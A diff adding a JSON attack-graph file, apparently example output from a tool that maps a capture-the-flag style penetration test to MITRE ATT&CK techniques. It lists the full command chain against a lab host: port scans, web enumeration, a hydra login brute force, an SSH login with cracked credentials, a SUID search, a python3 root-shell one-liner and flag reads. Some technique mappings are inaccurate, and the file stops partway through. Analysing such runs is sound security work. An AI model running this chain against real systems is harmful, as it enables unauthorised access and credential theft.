@@ -1,0 +1,1340 @@
+{
+  "meta": {
+    "total_entries": 13,
+    "source_files": [
+      "example.txt"
+    ]
+  },
+  "nodes": [
+    {
+      "id": "cmd::0",
+      "layer": "command",
+      "label": "nmap -Pn -T4 -p- 10.10.10.5",
+      "entry_id": 0,
+      "source_file": "example.txt",
+      "command": "nmap -Pn -T4 -p- 10.10.10.5",
+      "reasoning": "Starting enumeration of the target machine.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 0,
+        "tool": "nmap",
+        "action": "scanAllPorts",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -Pn -T4 -p- 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 0,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 0,
+        "action_name": "scanAllPorts",
+        "action_description": "Scan all TCP ports on target",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "openPortsKnown"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::1",
+      "layer": "command",
+      "label": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "entry_id": 1,
+      "source_file": "example.txt",
+      "command": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 1,
+        "tool": "nmap",
+        "action": "scanAllPorts",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -sV -sC -p 22,80,3306 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 1,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 1,
+        "action_name": "scanAllPorts",
+        "action_description": "Scan all TCP ports on target",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "openPortsKnown"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::2",
+      "layer": "command",
+      "label": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/di",
+      "entry_id": 2,
+      "source_file": "example.txt",
+      "command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt",
+      "reasoning": "Found port 80 open with Apache. Let's check for web vulnerabilities.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 2,
+        "tool": "gobuster",
+        "action": "enumerateWebDirs",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt"
+      },
+      "mitre": {
+        "entry_id": 2,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 2,
+        "action_name": "enumerateWebDirs",
+        "action_description": "Enumerate web directories",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "webDirsKnown"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::3",
+      "layer": "command",
+      "label": "nikto -h http://10.10.10.5",
+      "entry_id": 3,
+      "source_file": "example.txt",
+      "command": "nikto -h http://10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 3,
+        "tool": "nikto",
+        "action": "scanWebApp",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nikto -h http://10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 3,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 3,
+        "action_name": "scanWebApp",
+        "action_description": "Scan web app for vulns",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "webVulnsKnown"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#f1c94e",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::4",
+      "layer": "command",
+      "label": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.",
+      "entry_id": 4,
+      "source_file": "example.txt",
+      "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\"",
+      "reasoning": "Discovered /admin login page. Trying default credentials first, then brute force.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 4,
+        "tool": "hydra",
+        "action": "bruteForceCredentials",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\""
+      },
+      "mitre": {
+        "entry_id": 4,
+        "technique_id": "T1110",
+        "technique_name": "Brute Force",
+        "tactic": "credential-access",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 4,
+        "action_name": "bruteForceCredentials",
+        "action_description": "Brute-force login service",
+        "phase": "exploitation",
+        "produces_effects": [
+          "credentialsObtained"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#da77f2",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::5",
+      "layer": "command",
+      "label": "ssh admin@10.10.10.5",
+      "entry_id": 5,
+      "source_file": "example.txt",
+      "command": "ssh admin@10.10.10.5",
+      "reasoning": "Got credentials admin:password123. Logging in via SSH.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 5,
+        "tool": "ssh",
+        "action": "loginSSH",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "ssh admin@10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 5,
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 5,
+        "action_name": "loginSSH",
+        "action_description": "Log in via SSH",
+        "phase": "exploitation",
+        "produces_effects": [
+          "shellAccessGained"
+        ],
+        "requires_effects": [
+          "credentialsObtained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::6",
+      "layer": "command",
+      "label": "whoami",
+      "entry_id": 6,
+      "source_file": "example.txt",
+      "command": "whoami",
+      "reasoning": "Checking what we have access to.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 6,
+        "tool": "whoami",
+        "action": "gatherSystemInfo",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "whoami"
+      },
+      "mitre": {
+        "entry_id": 6,
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 6,
+        "action_name": "gatherSystemInfo",
+        "action_description": "Gather system user info",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "systemInfoKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::7",
+      "layer": "command",
+      "label": "id",
+      "entry_id": 7,
+      "source_file": "example.txt",
+      "command": "id",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 7,
+        "tool": "id",
+        "action": "gatherSystemInfo",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "id"
+      },
+      "mitre": {
+        "entry_id": 7,
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 7,
+        "action_name": "gatherSystemInfo",
+        "action_description": "Gather system user info",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "systemInfoKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::8",
+      "layer": "command",
+      "label": "sudo -l",
+      "entry_id": 8,
+      "source_file": "example.txt",
+      "command": "sudo -l",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 8,
+        "tool": "sudo",
+        "action": "executeCommand",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "sudo -l"
+      },
+      "mitre": {
+        "entry_id": 8,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 8,
+        "action_name": "executeCommand",
+        "action_description": "Execute sudo",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "commandExecuted"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::9",
+      "layer": "command",
+      "label": "find / -perm -4000 -type f 2>/dev/null",
+      "entry_id": 9,
+      "source_file": "example.txt",
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 9,
+        "tool": "find",
+        "action": "findSUIDBinaries",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "find / -perm -4000 -type f 2>/dev/null"
+      },
+      "mitre": {
+        "entry_id": 9,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 9,
+        "action_name": "findSUIDBinaries",
+        "action_description": "Find SUID binaries",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "suidBinariesKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::10",
+      "layer": "command",
+      "label": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "entry_id": 10,
+      "source_file": "example.txt",
+      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "reasoning": "Found SUID binary. Exploiting for root.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 10,
+        "tool": "python3",
+        "action": "executeCommand",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      },
+      "mitre": {
+        "entry_id": 10,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 10,
+        "action_name": "executeCommand",
+        "action_description": "Execute python3",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "commandExecuted"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::11",
+      "layer": "command",
+      "label": "cat /root/flag.txt",
+      "entry_id": 11,
+      "source_file": "example.txt",
+      "command": "cat /root/flag.txt",
+      "reasoning": "Got root! Reading the flag.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 11,
+        "tool": "cat",
+        "action": "readSensitiveFile",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /root/flag.txt"
+      },
+      "mitre": {
+        "entry_id": 11,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 11,
+        "action_name": "readSensitiveFile",
+        "action_description": "Read a file",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "fileContentsRead"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::12",
+      "layer": "command",
+      "label": "cat /home/user/user.txt",
+      "entry_id": 12,
+      "source_file": "example.txt",
+      "command": "cat /home/user/user.txt",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 12,
+        "tool": "cat",
+        "action": "readSensitiveFile",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /home/user/user.txt"
+      },
+      "mitre": {
+        "entry_id": 12,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 12,
+        "action_name": "readSensitiveFile",
+        "action_description": "Read a file",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "fileContentsRead"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    }
+  ],
+  "actions_effects_nodes": [
+    {
+      "id": "action::scanAllPorts",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanAllPorts",
+      "name": "scanAllPorts",
+      "description": "Scan all TCP ports on target",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        0,
+        1
+      ],
+      "produces_effects": [
+        "openPortsKnown"
+      ],
+      "requires_effects": []
+    },
+    {
+      "id": "action::enumerateWebDirs",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "enumerateWebDirs",
+      "name": "enumerateWebDirs",
+      "description": "Enumerate web directories",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        2
+      ],
+      "produces_effects": [
+        "webDirsKnown"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::scanWebApp",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanWebApp",
+      "name": "scanWebApp",
+      "description": "Scan web app for vulns",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        3
+      ],
+      "produces_effects": [
+        "webVulnsKnown"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::bruteForceCredentials",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "bruteForceCredentials",
+      "name": "bruteForceCredentials",
+      "description": "Brute-force login service",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        4
+      ],
+      "produces_effects": [
+        "credentialsObtained"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::loginSSH",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "loginSSH",
+      "name": "loginSSH",
+      "description": "Log in via SSH",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        5
+      ],
+      "produces_effects": [
+        "shellAccessGained"
+      ],
+      "requires_effects": [
+        "credentialsObtained"
+      ]
+    },
+    {
+      "id": "action::gatherSystemInfo",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "gatherSystemInfo",
+      "name": "gatherSystemInfo",
+      "description": "Gather system user info",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        6,
+        7
+      ],
+      "produces_effects": [
+        "systemInfoKnown"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::executeCommand",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "executeCommand",
+      "name": "executeCommand",
+      "description": "Execute sudo",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        8,
+        10
+      ],
+      "produces_effects": [
+        "commandExecuted"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::findSUIDBinaries",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "findSUIDBinaries",
+      "name": "findSUIDBinaries",
+      "description": "Find SUID binaries",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        9
+      ],
+      "produces_effects": [
+        "suidBinariesKnown"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::readSensitiveFile",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "readSensitiveFile",
+      "name": "readSensitiveFile",
+      "description": "Read a file",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        11,
+        12
+      ],
+      "produces_effects": [
+        "fileContentsRead"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "effect::openPortsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "openPortsKnown",
+      "name": "openPortsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanAllPorts"
+      ],
+      "enables_actions": [
+        "enumerateWebDirs",
+        "scanWebApp",
+        "bruteForceCredentials"
+      ]
+    },
+    {
+      "id": "effect::webDirsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "webDirsKnown",
+      "name": "webDirsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "enumerateWebDirs"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::webVulnsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "webVulnsKnown",
+      "name": "webVulnsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanWebApp"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::credentialsObtained",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "credentialsObtained",
+      "name": "credentialsObtained",
+      "color": "#6e48aa",
+      "produced_by": [
+        "bruteForceCredentials"
+      ],
+      "enables_actions": [
+        "loginSSH"
+      ]
+    },
+    {
+      "id": "effect::shellAccessGained",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "shellAccessGained",
+      "name": "shellAccessGained",
+      "color": "#6e48aa",
+      "produced_by": [
+        "loginSSH"
+      ],
+      "enables_actions": [
+        "gatherSystemInfo",
+        "executeCommand",
+        "findSUIDBinaries",
+        "readSensitiveFile"
+      ]
+    },
+    {
+      "id": "effect::systemInfoKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "systemInfoKnown",
+      "name": "systemInfoKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "gatherSystemInfo"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::commandExecuted",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "commandExecuted",
+      "name": "commandExecuted",
+      "color": "#6e48aa",
+      "produced_by": [
+        "executeCommand"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::suidBinariesKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "suidBinariesKnown",
+      "name": "suidBinariesKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "findSUIDBinaries"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::fileContentsRead",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "fileContentsRead",
+      "name": "fileContentsRead",
+      "color": "#6e48aa",
+      "produced_by": [
+        "readSensitiveFile"
+      ],
+      "enables_actions": []
+    }
+  ],
+  "mitre_nodes": [
+    {
+      "id": "mitre::T1046",
+      "layer": "mitre",
+      "label": "T1046",
+      "technique_name": "Network Service Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        0,
+        1
+      ]
+    },
+    {
+      "id": "mitre::T1083",
+      "layer": "mitre",
+      "label": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        2,
+        9,
+        11,
+        12
+      ]
+    },
+    {
+      "id": "mitre::T1059",
+      "layer": "mitre",
+      "label": "T1059",
+      "technique_name": "Command and Scripting",
+      "tactic": "execution",
+      "color": "#f1c94e",
+      "entry_ids": [
+        3,
+        8,
+        10
+      ]
+    },
+    {
+      "id": "mitre::T1110",
+      "layer": "mitre",
+      "label": "T1110",
+      "technique_name": "Brute Force",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        4
+      ]
+    },
+    {
+      "id": "mitre::T1078",
+      "layer": "mitre",
+      "label": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "initial-access",
+      "color": "#c97fc9",
+      "entry_ids": [
+        5
+      ]
+    },
+    {
+      "id": "mitre::T1033",
+      "layer": "mitre",
+      "label": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        6,
+        7
+      ]
+    }
+  ],
+  "edges": [
+    {
+      "source": "cmd::0",
+      "target": "cmd::1",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::1",
+      "target": "cmd::2",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::2",
+      "target": "cmd::3",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::3",
+      "target": "cmd::4",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::4",
+      "target": "cmd::5",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::5",
+      "target": "cmd::6",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::6",
+      "target": "cmd::7",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::7",
+      "target": "cmd::8",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::8",
+      "target": "cmd::9",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::9",
+      "target": "cmd::10",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::10",
+      "target": "cmd::11",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::11",
+      "target": "cmd::12",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "action::scanAllPorts",
+      "target": "effect::openPortsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::enumerateWebDirs",
+      "target": "effect::webDirsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::enumerateWebDirs",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::scanWebApp",
+      "target": "effect::webVulnsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::scanWebApp",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::bruteForceCredentials",
+      "target": "effect::credentialsObtained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::bruteForceCredentials",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::loginSSH",
+      "target": "effect::shellAccessGained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::credentialsObtained",
+      "target": "action::loginSSH",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::gatherSystemInfo",
+      "target": "effect::systemInfoKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::gatherSystemInfo",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::executeCommand",
+      "target": "effect::commandExecuted",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::executeCommand",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::findSUIDBinaries",
+      "target": "effect::suidBinariesKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::findSUIDBinaries",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::readSensitiveFile",
+      "target": "effect::fileContentsRead",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::readSensitiveFile",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "mitre::T1046",
+      "target": "mitre::T1083",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1083",
+      "target": "mitre::T1059",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1059",
+      "target": "mitre::T1110",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1110",
+      "target": "mitre::T1078",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1078",
+      "target": "mitre::T1033",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "cmd::0",
+      "target": "action::scanAllPorts",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::0",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "action::scanAllPorts",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::1",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "action::enumerateWebDirs",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::2",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "action::scanWebApp",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::3",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "action::bruteForceCredentials",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::4",
+      "target": "mitre::T1110",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "action::loginSSH",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::5",
+      "target": "mitre::T1078",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "action::gatherSystemInfo",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "action::gatherSystemInfo",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::7",
+      "target": "mitre::T1033",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "action::executeCommand",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::8",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "action::findSUIDBinaries",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::9",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "action::executeCommand",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "mitre::T1059",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "action::readSensitiveFile",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "action::readSensitiveFile",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::12",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    }
+  ],
+  "color_maps": {
+    "phase": {
+      "reconnaissance": "#4e9af1",
+      "exploitation": "#e84a4a",
+      "post-exploitation": "#f1c94e",
+      "lateral-movement": "#20b2aa",
+      "persistence": "#a0d468",
+      "exfiltration": "#ff4757",
+      "noise": "#555555"
+    },
+    "mitre_tactic": {
+      "reconnaissance": "#4e9af1",
+      "resource-development": "#7ec8e3",
+      "initial-access": "#c97fc9",
+      "execution": "#f1c94e",
+      "persistence": "#a0d468",
+      "privilege-escalation": "#e84a4a",
